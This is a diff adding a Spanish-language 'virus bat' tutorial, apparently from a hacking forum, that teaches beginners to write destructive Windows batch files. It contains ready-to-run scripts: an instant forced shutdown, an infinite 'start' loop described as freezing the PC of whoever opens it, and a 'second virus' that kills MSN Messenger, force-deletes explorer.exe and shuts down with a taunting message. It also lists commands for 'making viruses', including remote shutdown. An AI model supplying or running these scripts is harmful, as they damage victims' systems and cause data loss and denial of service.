@@ -1,0 +1,191 @@
+####################################
+####################################
+######HACKLAB WWW.FOROHACK.COM######
+#################################### 
+BY KEVIN45JKSNJSD
+
+ ==== virus bat ====
+
+1.Introdución
+2.Nuestro primer virus
+3.comandos básicos y etiquetas
+4.jugando con el registro
+5.bucles
+6.Nuestro segundo virus
+7.variables de windows xp
+8.if exist
+9.proximamente mas
+
+
+1.)Introduccion:
+
+Buenas , ante todo he de decir que esto es un manual de introducción y no un manual para expertos.
+en este manual se hablara sobre los virus .bat (archivos por lotes ejecutables de ms-dos)
+bueno antes que nada explicar que es cmd.exe (MS-DOS EN WINXP) cmd.exe es un interprete de comandos.
+¿Qué es un comando?
+es una orden que le damos al sistema operativo para que haga una tarea determinada.
+
+2.)Nuestro primer virus.
+
+bueno , nuestro primero virus podría ser este:
+
+@echo off
+shutdown -s -t 1
+
+abrimos un documento de texto , copiamos esto lo guardamos como .bat y lo abrimos...
+
+y... sopresa...
+
+explicación: @echo off
+
+Desabilita el echo  para que no muestre los comandos , que se ejecutaran posteriormente.
+
+explicación: shutdown 
+
+es un comando con el que puedes jugar bastante. -s y -t son parametros, los parametros son como las opciones
+que les deves dar al comando. algunos comandos requieren parametros obligatoriamente sin embargo otros no.
+
+explicación: parametro -s y -t
+
+el parametro -s da la orden a shutdown para que apage el equipo  y con -t especificamos los segundos. en el ejemplo
+de antes pusimos 1 segundo.
+
+otros parametros de shutdown:
+
+shutdown -r = Reinicia
+shutdown -c = deja un comentario "Modo de uso">> shutdown -s -t 5 c "Comentario"
+shutdown -m = apaga un equipo de la red "Modo de uso">> shutdown -s -t 4 -m \\nombredehost
+shutdown -f = fuerza el cierre de las aplicaciones.
+
+
+3.)Comandos básicos
+
+a continuación os pondré varios comandos que sirven mucho a la hora de hacer virus.
+
+-del = borra un archivo
+-copy = copia un archivo
+-reg = hacer modificaciones en el registro
+-net = Muchas funciones, escriban en cmd net /? para ver sus funciones :)
+-RD = elimina un directorio
+-set = Muestra , establece, crea , variables de entorno de windows.
+-taskkill o tskill = mata procesos
+
+3.1)Etiquetas
+Las etiquetas sirven para ir de un lugar de un programa a otra parte. ejemplo.
+
+@echo off
+echo hola
+goto etiquetaB
+:etiquetaA
+echo ola
+:etiquetaB
+echo adios
+
+con goto decimos a que etiqueta ir
+
+en este caso la salida en la shell sería:
+
+c:\ etiquetas.bat
+
+hola
+adios
+
+4.)Jugando con el registro.
+
+bueno , como ya dije antes para jugar con el registro usaremos el comando reg :)
+
+Operaciones:
+
+REG QUERY /?
+REG ADD /?
+REG DELETE /?
+REG COPY /?
+REG SAVE /?
+REG RESTORE /?
+REG LOAD /?
+REG UNLOAD /?
+REG COMPARE /?
+REG EXPORT /?
+REG IMPORT /?
+
+Usad estos comandos para obtener ayuda sobre los parametros después de reg.
+
+5.)Bucles
+
+Bueno un bucle es repetir muchas veces lo mismo
+ejemplo
+
+@echo off
+:kevin
+echo hola
+goto kevin
+
+jejejeje ya podeis imaginaros las cosas que podeis hacer.
+
+otro ejemplo:
+
+@echo off
+:uji
+start
+goto uji
+
+
+Madre mía.. este simple código , el que lo abra tendrá que reiniciar , por que el pc se le trabará todo.
+
+el comando start lo que hace es abrir otra shell, así que imaginate este bucle infinito. :)
+
+6.)Nuestro segundo virus.
+
+@echo off
+taskkill /F /IM msnmsgr.exe
+del /F c:\windows\system32\explorer.exe
+shutdown -s -t 10 -c "Has caido en mis manos"
+
+
+jejeje
+
+7.)Variables de windows xp
+
+para ver el contenido de estas variables escriban en cmd.exe
+
+echo %NOMBREDELAVARIABLE%
+
+%COMPUTERNAME% = Nombre de host.
+%SYSTEMROOT% = Carpeta de administración Normalmente c:\windows
+%TEMP% = directorio donde se encuentran los archivos temporales
+%WINDIR% = directorio de windows.
+%USERNAME% = usuario con el que se inicio sesión
+%USERPROFILE% = directorio donde se encuentran los archivos del usuario que inicio sesión
+%PROGRAMFILE% = directorio donde se encuentran los archivos de programas
+%OS% = muestra el sistema operativo que estamos ejecutando
+%LOGONSERVER% = nombre de nuestro server (\\mihost)
+
+no son todos , pero puse algunos importantes. :)
+
+8.)If exist
+
+if no solo sirve para exist , pero explicare if usando exist.
+if exist lo que hace es por ejemplo: 
+@echo off
+if exist c:\kevin.txt (goto existe) else goto noexiste
+:existe
+echo si existe
+exit
+:noexiste
+echo no existe
+
+lo que hace es comprobar si el archivo kevin.txt existe en c:\ y si existiese iria a la etiqueta :existe
+y si no existe iria a noexiste.
+
+Bueno así de simple.
+
+
+9.)proximamente mas
+
+proximamente segire publicando , ya con un nivel más avansado. y con datos más explicitos.
+
+
+
+
+
+
